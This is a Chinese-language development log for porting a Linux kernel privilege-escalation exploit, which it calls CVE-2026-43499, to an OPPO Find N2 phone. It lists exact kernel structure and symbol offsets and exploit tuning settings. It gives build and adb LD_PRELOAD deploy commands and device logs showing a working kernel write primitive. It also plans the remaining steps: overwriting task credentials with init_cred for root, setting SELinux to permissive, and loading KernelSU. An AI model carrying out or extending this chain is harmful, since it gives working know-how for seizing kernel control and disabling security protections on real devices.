# matisse 路线移植记录 (exploit-v29)

> 2026-10-04 · 从 `ihamn/matisse-public`(GPL-3.0)移植到 OPPO Find N2 / PGU110 / SM8475 / kernel 5.10.236

## 0. 为什么换路线:KGSL/cheese 已证伪

| 试验 | 次数 | 命中 |
|---|---|---|
| `CHEESE_PHYADDR` 注入(OPPO 高段/低段采样) | 12 | 0 |
| 原生全量扫描(源机 256 个地址) | 219 | 0 |
| **合计** | **231** | **0** |

源机 256 个地址全部落在 OPPO 高段 [32–46GB] 内,若机制生效理论上应有 ~25% 命中。
`0.75^231 ≈ 10^-29` → **不是地址挑错,是 GPU 侧机制在 OPPO 上根本没生效**。
旁证(OPPO 内核源码 `drivers/gpu/msm/`):exploit 的 PM4 载荷字数与本代 CP 期望不符
(`CP_SMMU_TABLE_UPDATE` exploit cnt=4 vs 驱动 cnt=3;`CP_MEM_WRITE` 3 vs 5)。

**结论:放弃 KGSL/cheese,改走 matisse 路线。**

## 1. matisse 是什么

`ihamn/matisse-public` —— Redmi K50 Pro(matisse / MT6983 MediaTek)/ kernel 5.10.209,
**同一个 GhostLock(CVE-2026-43499)家族、同一套上游框架**(`common.h / fops.c / main.c /
pipe.c / root.c / slide.c / su_daemon.c / util.c / offset.h / targets/` 与 `exploit/` 逐一对应),
**并且已在真机上取得 `uid=0` + kernel SID + KernelSU late-load,全程未崩机**。

### 取胜配方(五轮)

```
R 轮   task->real_cred = init_cred          (rb_erase 受控写:STORE(a) *(pc+8)=right)
E5 轮  selinux_state+0(enforcing) 清零      (pi_tree 几何,写值 0 → Permissive)
C 轮   task->cred = init_cred               (→ 真 uid=0)
gate   真 uid=0 那一刻 system("sh ksu_go.sh &") → ksud late-load 装 KernelSU
HOLD   PSELECT_HOLD=1 持毒进程常驻不退
```

### 四个硬坑(均有实测根因)

1. `finit_module` 必失败(fd 被 prep churn ⇒ EBADF / SELinux 拒)⇒ 走官方 `ksud late-load`。
2. exec 必须插在 **gate(真 uid=0)**,不能插在 R 阶段(否则 `ksu_go.log` 里是 `uid=2000`)。
3. C 落地后进程 `_exit` ⇒ mm teardown ⇒ `lock_page_memcg`/`page_remove_rmap` panic ⇒ **必须 HOLD**。
4. HOLD 后 cred=`init_cred`,**任何 SIGKILL 等同杀 init**(`Attempted to kill init`)⇒ 拔掉所有 kill 路径。

## 2. 我方旧代码缺的东西(精确对表)

| 机制 | matisse | `exploit/`(旧) |
|---|---|---|
| v29 `block_holder` 三互斥锁**深 PI 链** | ✓ | ❌ —— 没有它 `owner->pi_blocked_on==NULL`,`rt_mutex_adjust_prio_chain` 单层走链,**Call 2/3 永不执行** |
| `tree_right`/`tree_left`/`task`/`lock` 词 + 正确基址(**0/3/8**) | ✓ | ❌ 基址 2/5/10,且**缺 `tree_right`(要写入的值)** |
| `perf_find_task()` perf 泄露 task/cred | ✓ | ❌ |
| 真 CVE 路径 `slide_v37_trigger`(WAIT_REQUEUE_PI + CMP_REQUEUE_PI) | ✓ 启用 | ❌ **`slide.c` 被整个弃用**("架构性死路") |
| setsockopt 512B stamp(v37/mt20,取代 pselect 覆盖) | ✓ | ❌ |
| `PSELECT_PTR_MODE`(先 real_cred 后 cred) | ✓ | ❌ |
| `PSELECT_HOLD` / E5-ENF 几何 / PTR_STRICT AND-gate | ✓ | ❌ |
| `PSELECT_ROUTE_NFDS` | 320 | 640 |

## 3. 已用 OPPO 自己的内核库(output.elf)实测确认的值

所有值均由 `.symtab`(143,599 符号)或反汇编读出,非猜测。

### 3.1 cred 指针:旧值错 0xa0

```asm
; commit_creds @ 0xffffffc008186784
mrs  x20, sp_el0
ldr  x19, [x20, #0x778]      ; task->real_cred
ldr  x8,  [x20, #0x780]      ; task->cred
cmp  x8, x19
b.ne -> brk #0x800           ; BUG_ON(cred != real_cred)
; prepare_creds @ 0xffffffc008186070
ldr  x20, [curtask, #0x780]  ; current->cred
```
`task+0x770 = ptracer_cred`(matisse 现场实证),`0x778 = real_cred`,`0x780 = cred`。

| | 旧 target.h | 实测 |
|---|---|---|
| `TASK_REAL_CRED_OFF` | 0x818 ❌ | **0x778** |
| `TASK_CRED_OFF` | 0x820 ❌ | **0x780** |
| `CRED_UID_OFF` | 8 ❌ | **4**(0x8 是 gid+suid) |
| `CRED_SECUREBITS_OFF` | 40 ❌ | **0x24** |
| `CRED_CAPS_OFF` | 48 ❌ | **0x28**(cap_inheritable) |

`commit_creds` 在 `+0x14/+0x18/+0x1c/+0x20` 比较 32 位身份字段(euid/egid/fsuid/fsgid),
故 uid 块从 0x04 起;`sizeof(cred)=0xa8`,`cred->security@0x80` 一致。

### 3.2 `struct rt_mutex_waiter`:matisse 的 0x44 不适用于本机

```asm
; task_blocks_on_rt_mutex @ 0xffffffc0081ecaf0
stp  x20, x19, [x22, #0x30]  ; waiter->task@0x30, waiter->lock@0x38
str  w8,  [x22, #0x40]       ; waiter->prio@0x40      ← matisse 写的是 0x44
str  x8,  [x22, #0x48]       ; waiter->deadline@0x48
str  x22, [x20, #0x898]      ; task->pi_blocked_on = waiter
; rt_mutex_adjust_prio_chain @ 0xffffffc0081ed8ec
ldr  x28, [x19, #0x898]; ldr [x28,#0x38](lock); ldr w9,[x28,#0x40](prio)
```
→ `{tree_entry@0x00, pi_tree_entry@0x18, task@0x30, lock@0x38, prio@0x40, pad@0x44,
deadline@0x48}`,`sizeof = 0x50`。**本机无 `wake_state`/`ww_ctx`。**
⇒ `fops.c` 的 word 8 必须是 **`prio_val`(低 dword)**,不能用 matisse 的 `(prio<<32)|3`
(那会把 prio 写成 3、真值写进 padding)。已在代码中按 `WAITER_WAKE_STATE_OFF` 条件编译。

### 3.3 SELinux enforcing 在 `state+0`,不是 `state+1`

```asm
; avc_denied @ 0xffffffc0088fc49c
ldarb w12, [x0]        ; x0 = selinux_state
tbz   w12, #0          ; bit0==0 → allow
```
⇒ `SELINUX_ENFORCING_OFF = SELINUX_STATE_OFF + 0`。
(旧 target.h 的 `0x02774c84` 是 `selinux_enforcing_boot`,另一个变量,E5 不用它。)

### 3.4 file_operations 三处"错位一个函数"

| 旧值 | 实际符号 | 正确值 |
|---|---|---|
| `COPY_SPLICE_READ_OFF 0x5e6830` | `iter_file_splice_write`(**写**函数) | `generic_file_splice_read` **0x5e6c68** |
| `CONFIGFS_READ_ITER_OFF 0x6b038c` | `configfs_hash_and_remove+0x4a4` | `configfs_read_bin_file` **0x6b0d0c** |
| `CONFIGFS_BIN_WRITE_ITER_OFF 0x6b050c` | `configfs_read_file` | `configfs_write_bin_file` **0x6b0f84** |

### 3.5 语义澄清:`ASHMEM_MISC_FOPS` 是**写入目标**,不是表地址

`miscdevice { int minor; char *name; fops*; }` → `fops` 在 `+0x10`。
旧 target.h 把 `ASHMEM_MISC_FOPS_OFF` 设成 `ashmem_fops` 表地址(0x22c0048),
与本框架"覆盖 misc 设备的 fops 指针"的用法不是一回事。
本机 `ashmem_misc` 符号 @ `0x0291a8d8` ⇒ 写入目标 = `0x0291a8d8 + 0x10`。

### 3.6 符号表(实测,供复查)

```
_text                 0x0000000000    init_task       0x027cc000    init_cred   0x027e0be0
__entry_task          0x027872f8      __per_cpu_offset 0x027ba5d8   root_task_group 0x029c8040
selinux_state         0x02a793c8      selinux_blob_sizes 0x02302bc0 security_hook_heads 0x02302528
kmalloc_caches        0x02302060      anon_pipe_buf_ops 0x0216aa68  noop_llseek 0x0056cf68
generic_file_splice_read 0x005e6c68   ashmem_fops     0x022c0048    ashmem_misc 0x0291a8d8
configfs_bin_file_operations 0x02175920   configfs_read_bin_file 0x006b0d0c
configfs_write_bin_file 0x006b0f84   nfulnl_logger 0x027c14b8
ashmem{llseek,read_iter,ioctl,compat_ioctl,mmap,open,release,show_fdinfo}
   = 0x011ee5d4 / 0x011ee6ec / 0x011ee7d0 / 0x011ef2e0 / 0x011ef340 / 0x011ef580 / 0x011ef620 / 0x011ef744
```

## 4. 仍需上机标定(唯一真正的未知)

- `PSELECT_ROUTE_NFDS` + word `shift`(fd_set ↔ rt_mutex_waiter 的栈对齐)。
  matisse = 320/0(且 `PSELECT_SHIFT` 只有 0 被内核读到过);本机待扫。
- 新版 stamp 用 **setsockopt 512B**(本机需确认落地槽位)。
- `perf_event_open` 在 shell(uid 2000)身份下是否可用。
- `FAKE_WAITER_*` / `FAKE_TASK_*`(页面内伪造结构)尚未在本机验证。

## 5. 目录与构建

```
exploit-v29/                      ← 本次移植(matisse 框架 + OPPO target)
  Makefile                        PROJECT ?= oppo-find_n2
  assets/wallpaper.webp
  src/{main,util,slide,fops,pipe,root,preload,su_daemon}.c  su_blob.S  wallpaper_blob.S
  src/common.h                    (含 LOCK_OFF 0x1350 / W0_OFF 0x2220)
  src/targets/oppo-find_n2/target.h   ← 本机偏移,每个值都标了来源
  src/targets/…                    (其他机型 target 已移除)
exploit/                          ← 旧框架,保留作参考(slide.c 已弃用)
```

```bash
# 构建(需要 NDK r29;本机无 NDK,见 §6)
cd exploit-v29
make PROJECT=oppo-find_n2 NDK_ROOT=<ndk> SHA256SUM=sha256sum
# 产物 build/oppo-find_n2/bin/preload.so

# 部署
adb push build/oppo-find_n2/bin/preload.so /data/local/tmp/
adb shell 'LD_PRELOAD=/data/local/tmp/preload.so /system/bin/ls /dev/null'
```

## 6. 设备实测结果(2026-10-04,serial 84cb96e2)

产物:`exploit-v29/build/oppo-find_n2/bin/preload.so`,193,240 B,
sha256 `a0b591af7e86efb5e8f073daa9323f15c059d01f9156f96d5bcce5612bf6650e`
(clang 21.0.0 / NDK r29 / `aarch64-linux-android35-clang`;本机无 make,见 `oppo-2/build_v29.sh`)

### 6.1 设备前提(全部满足)

| 项 | 实测 |
|---|---|
| `perf_event_paranoid` | -1 |
| `CONFIG_FUTEX_PI` / `RT_MUTEXES` | y |
| `CONFIG_ARM64_VA_BITS` | **39** ✔(内存布局假设成立) |
| `CONFIG_SLUB` / `SLUB_CPU_PARTIAL` | y ✔(kmalloc 几何前提) |
| `CONFIG_DEBUG_RT_MUTEXES` | 未设 ✔(证实 waiter=0x50,无 debug 字段) |
| `CONFIG_CFI_CLANG` / `CFI_PERMISSIVE` | y / **未设**(CFI 强制) |
| `/dev/ashmem`、`/sys/kernel/config` | 存在 ✔ |
| `/proc/sys/kernel/random/boot_id` | 可读 ✔ |
| `/proc/kallsyms` | **Permission denied**(拿不到 slide) |

### 6.2 首次运行(preload 加载即跑,constructor 无门控)

```
[+] build config  label=oppo_pgu110_16.0.5.1001_cn01 slide=pselect main=pselect
[+] p0 profile    phys_offset=80000000 kernel_phys_load=a8000000 delta=28000000
                  init_task=ffffff802a7cc000 root_tg=ffffff802a9c8040
[*] KernelSnitch  found 3 collisions;8 线程暴力扫 mm_struct 8 个直映射区间
[*] mt47-c: leak pin via SCM_RIGHTS OK (fd=513)
[*] prepare_kernel_page: SKB reclaim sends OK
```
→ **目标头被正确采纳,直接映射别名算对,KernelSnitch/SCM_RIGHTS/SKB 全部可用,无崩溃无重启。**

### 6.3 阻塞点

**(a) `perf_event_open` → EACCES。** 用 `oppo-2/perfprobe.c` 逐个配置实测:

| 配置 | 结果 |
|---|---|
| SW_CPU_CLOCK 纯计数 | EACCES |
| +SAMPLE_IP +exclude_kernel | **OK** |
| +REGS_INTR +exclude_kernel | **OK** |
| matisse 原配(REGS_INTR + exclude_user,采内核态) | **EACCES** |
| +SAMPLE_IP(含内核态) | EACCES |
| HW_CPU_CYCLES 纯计数 | EACCES |

⇒ **SELinux 只放行 `exclude_kernel=1`(纯用户态采样)**;matisse 的 `perf_find_task` 必须采内核寄存器 ⇒ 该路线在本机被关闭。
⇒ 改用框架自带的 **FOPS 阶段**(不需 perf):覆盖已知地址 `ASHMEM_MISC_FOPS` 拿读写原语 → 走 `init_task.tasks` 找自身 task。

**(b) `pselect` 不阻塞 ⇒ 竞态窗口为零。** FOPS 阶段实跑:

```
PSELECT_SHIFT=0 tree_pc=ffffff802a91a8d9 tree_right=ffffff87c0368180
                pi_parent=ffffff8002a41b91 target=ffffff802a91a8e8 ...
pselect_thread returned attempt=4 ret=114 errno=0 calls=0 success=0
pselect returned attempt=1 ret=112 errno=0 calls=0 success=0
pipe physrw  done=0 root=0 read_ok=0 write_ok=0
```
`ret=112..114` = pselect 立刻返回约 112 个"就绪 fd"(而非阻塞到 2 s 超时返回 0),
于是 `punch_consume_go` 在消费者线程看到之前就被清零 → `calls=0`,rb_erase 从未执行。
与 matisse 的差异:fd_set 位图由**指针值**填充(`tree_pc`/`tree_right`/…),不同指针 → 不同选中的 fd 集合。
需要在设备侧查明那 ~112 个 fd 为何被判就绪(可疑:被选中但未成功 `dup2` 的 fd 会被 select 计为 ready;
或 `out`/`ex` 集位的语义),然后调整 `PSELECT_ROUTE_NFDS` / `shift` / 选中集合。

**(c) KASLR 位置。** matisse 的 `slide_leak_kernel_base()` 是硬编码 `slide=0`(MTK 实测无随机化)。
本机 `CONFIG_RANDOMIZE_BASE=y`。但 R/E5/C 路径只使用 `P0_DATA_ALIAS_CONST`(直接映射物理别名)
+ 运行时泄露的 task 地址 ⇒ **理论上不依赖虚拟 slide**;待 (b) 打通后由写验证(boot_id)确认。

### 6.4 三条触发路径的实测(2026-10-04 晚)

判据统一用 `boot_id` 零写回读(与 configfs 无关,与 perf 无关)。

| # | 触发 | 结果 |
|---|---|---|
| ① | pselect fd_set 覆盖(FOPS 阶段) | ✅ 阻塞已修好(`ret=0`,5/5 轮 `calls=1 success=1`) ❌ `boot_id` 不落地 |
| ② | v37 拓扑(`PSELECT_V37=1`,**主线程** stamp) | `FCRQ errno=35 EDEADLK`(环成形,与 matisse 现场一致)、`FLPI ret=0` ❌ 不落地 |
| ③ | 同线程 stamp(`PSELECT_SLIDE_TRIGGER=1 PSELECT_STAMP=1`) | `FWRQ ETIMEDOUT` → `mt20 stamp` → `mt87b UNPOISON` → `mt19b sched 风暴` **全链执行** ❌ 仍不落地 |

从 `slide_waiter_thread` 的源码读出**设计要点**:stamp 必须在**刚释放 waiter 的那个线程**里打
(FWRQ 超时唤醒之后、UNPOISON 之前),因为"毒节点在本线程内核栈,悬垂 pi_blocked_on 在本线程
task_struct"。②从主线程打 stamp 属结构性错误。

③ 全链跑通却无写 ⇒ 剩余未知量 = **512B stamp 相对内核栈上 waiter 槽位的落点偏移**
(`slide_stamp_fake_waiter()` 的 `buf[0]/[6]/[7]/[8]` 假定缓冲区起点 == waiter 起点)。需要加
`PSELECT_STAMP_SHIFT` 旋钮在 512 字节内扫。

另有一处**语义前提未满足**:`mt60: pre-requeue words f_wait=0` 而 `CMP_REQUEUE_PI` 传的 `cmpval=1`
⇒ 内核侧 cmpval 检查不过 → requeue 不成立 ⇒ 整条链空转。(matisse 自己的注释也记了这个疑点:
"内核侧要求 curval 必须等于 1 … 但源码中无人显式置 1"。)

### 6.5 evidence/ 的旁证:matisse 的内核同样有 KASLR

`evidence/panic_excerpt_*.txt` 里三个不同 boot 的 panic 头:

```
Kernel Offset: 0x1330600000 from 0xffffffc008000000
Kernel Offset: 0x109fc00000 from 0xffffffc008000000
Kernel Offset: 0x2c3be00000 from 0xffffffc008000000
```

⇒ `slide_leak_kernel_base()` 硬编码 `slide=0` 并不反映真实布局,但它仍取胜 —— 反向印证该路线
**不依赖虚拟 slide**:R/E5/C 只用 `P0_DATA_ALIAS_CONST`(直接映射物理别名)+ 运行时泄露的 task 地址。
对本机而言,唯一必须正确的绝对值是 `P0_KERNEL_PHYS_LOAD = 0xa8000000`,而它有两个独立来源
(IDA/XBL 与 cheese exploit 的硬编码)。

### 6.6 stamp 位移扫描 + 根因定论

新增 `PSELECT_STAMP_SHIFT`(在 512B 缓冲内按 8 字节平移 fake waiter 全部字段),扫
0/1/2/4/8/16/32 七个位移,判据仍是 `boot_id` 零写回读:

| shift | 0 | 1 | 2 | 4 | 8 | 16 | 32 |
|---|---|---|---|---|---|---|---|
| boot_id | 未变 | 未变 | 未变 | 未变 | 未变 | 未变 | 未变 |
| 设备 | 未重启 | — | — | — | — | — | — |

**同时拿到了决定性的那一行**(此前被 grep 漏掉):

```
[*] mt59: requeue fired ret=-1 errno=35          ← EDEADLK,每一发都是
[*] mt60: waiter FWRQ ret=-1 errno=110 ETIMEDOUT  ← waiter 超时唤醒,从未拿到锁
```

把上游自己的注释与实测对上,根因唯一:

> `slide.c`: "内核 5.10 源码实证 (futex.c 2152-2167):CMP_REQUEUE_PI **撞 PI 环返回
> -EDEADLK 时只 break 循环把错误交还调用者,waiter 不会被唤醒也不会挂树**"

⇒ 当前拓扑(waiter `LOCK_PI(f_pi_chain)` + 在 `f_pi_target` 上 `WAIT_REQUEUE_PI`,owner
持有 target 并在 chain 上排队)**形成了 PI 环** ⇒ requeue 返回 EDEADLK ⇒ **waiter 从未挂到目标
PI 树上 ⇒ 不存在可毒化的 rb_node ⇒ stamp 打在哪个偏移都无意义**。位移扫描全灭是结构性的,
不是标定问题。上游 R4 尸检也记过同一结论:"R2/R3/R4 全部断链在 stack_copy 之前"。

**因此下一步不是标定,而是改拓扑**:让 requeue *成功*(waiter 真正排进 target 的 PI 树),
才能谈 stamp 落点。这正是需要真正改 `futex` 拓扑设计的一步。

### 6.7 栈深度静态推导(纯静态,未碰设备;解释了全部失败)

判据:所有局部量都在同一个线程的内核栈上,syscall 入口 sp 相同,于是
`局部深度 = Σ(调用链各帧) - 帧内偏移`。`rt_waiter` 的位置由
`futex_wait_requeue_pi` 里 `add x2, sp, #0x90` + `bl rt_mutex_wait_proxy_lock` 直接证实
(第三参即 `&rt_waiter`;`rt_mutex_init_waiter` 在该内核里已内联)。

| 原语 | 调用链(帧) | Σ | 缓冲位置 | 缓冲覆盖深度 | waiter@**0x210** |
|---|---|---|---|---|---|
| `setsockopt(IPPROTO_IPV6, MCAST_JOIN_SOURCE_GROUP)` | `__arm64_sys_setsockopt` 0x10 + `__sys_setsockopt` 0x80 + `sock_setsockopt` 0xa0 + `ipv6_setsockopt` 0x40 + `do_ipv6_setsockopt` 0x2d0 | **0x3A0** | `do_ipv6_setsockopt [sp+0x48]`,只拷 **264 B**(`cmp w22,#0x108; b.lo→EINVAL`) | `[0x358, 0x250]` | ❌ **够不到** |
| `pselect` 的 `stack_fds` | `__arm64_sys_pselect6` 0xa0 + `core_sys_select` 0x1c0 | **0x260** | `core_sys_select [sp+0x50]`,**256 B** | `[0x110, 0x210]` | ✅ **正好覆盖**,偏移 **0** |

⇒ **两条结论**:

1. **setsockopt 位移扫描全灭是结构性的** —— 该原语的缓冲整体比 waiter 深 0x148 字节,
   改位移不可能够到(`PSELECT_STAMP_SHIFT` 因此作废)。
2. **pselect 覆盖的几何本来就是对的(偏移 0)**,与 upstream 的 `PSELECT_WAITER_WORD_SHIFT`
   假设一致;之前失败的原因是**跑错了线程** —— FOPS 路径的 pselect 在独立线程里执行,而
   毒节点在 `slide_waiter_thread` 的栈上。正确用法是 SLIDE 路径里由 `slide_waiter_thread`
   自己调用的 `slide_pselect_stack_copy()`(即 **不设 `PSELECT_STAMP`**,
   走 `mt19` overlay 分支)。

### 6.8 ★里程碑:写原语在 OPPO 上成立(2026-10-04)

```
BOOTID_BEFORE: 43d19789-ae5b-4a91-9a28-6b5e55b9cf6b
BOOTID_AFTER:  04dd2d88-ffff-ff91-9a28-6b5e55b9cf6b      ← UUID 被改写
UPTIME: 2297.55 -> 2329.49                                ← 设备未重启
```

配置(全部由 §6.9 的静态推导 + upstream mt61 注释推出,**未启用 NO_UNPOISON**):

```
PSELECT_SKIP_WARMUP=1 PSELECT_SLIDE_TRIGGER=1 PSELECT_RETRY=1
PSELECT_TREE_PC=ffffff802ab99b66        # A=boot_id+1, pc=A-8(偶数⇒RED)
PSELECT_WINDOW_SECONDS=60               # 长窗口 = A1_1 赢形态
PSELECT_TRIGGER_SHOTS=16
（不设 PSELECT_STAMP —— setsockopt 那条已证结构够不到）
```

三条必要条件(缺一不可,均已实测):

1. **原语必须是 pselect 的 `stack_fds` 覆盖**:其缓冲恰覆盖 waiter 起点(偏移 0);
   `setsockopt(MCAST_JOIN_SOURCE_GROUP)` 的 264 B 缓冲整体深 0x148,结构上够不到。
2. **必须跑在 waiter 线程**(`slide_waiter_thread` 内调用),毒节点只在该线程栈上。
3. **窗口必须足够长**:consumer 风暴落在窗口内才会在 fdset 帧存活期间触发 erase
   (upstream mt61:"6 发触发全部落在窗口关闭之后 = erase 从未在 fdset 帧存活期间发生 =
   写结构上不可能")。

这一步打通后,整个利用链只剩"取自身 task 地址"这一环 —— perf 被 SELinux 关闭,
改用 `init_task.tasks` 遍历即可。

### 6.9 下一步(按优先级)

> 写原语已于 §6.8 打通。剩下只有"取自身 task 地址"这一环。

1. 用**已成立的写原语**读 task:实现基于 `init_task.tasks` 链表的遍历(框架自带
   `find_task_by_tgid`),替代被 SELinux 关闭的 perf 泄露;或直接用写原语改写
   `ASHMEM_MISC_FOPS` 取得读写原语后再遍历。
2. E5:`SELINUX_STATE_OFF+0` 零写(Permissive)。
3. C:`task+0x778`(real_cred)与 `task+0x780`(cred)都写 `init_cred` 别名
   —— 两个指针必须一致,否则 `commit_creds` 的 `BUG_ON` panic。
4. gate(真 uid=0 时 `ksud late-load`)→ `PSELECT_HOLD=1` 常驻。
5. **交付前**确保默认配置下设备不崩(不启用 `NO_UNPOISON`;长窗口本身无崩溃风险)。

### 6.10 已放弃/已证伪的路径(避免重走)

- **KGSL/cheese**:231/231 全灭,GPU 侧机制不生效(§0)。
- **configfs 验证**(`try_cfi_stage`):`direct write errno=22 EINVAL` —— 本机 ashmem 无 configfs 支持
  (旧项目文档已记 DEAD)。改用 `boot_id` 判据后可完全绕开。
- **perf 泄露**:SELinux 只放行 `exclude_kernel=1`(纯用户态采样),采内核寄存器被拒(§6.3a)。
- **pselect fd_set 覆盖**:竞态可成立但打不出写(§6.4①)。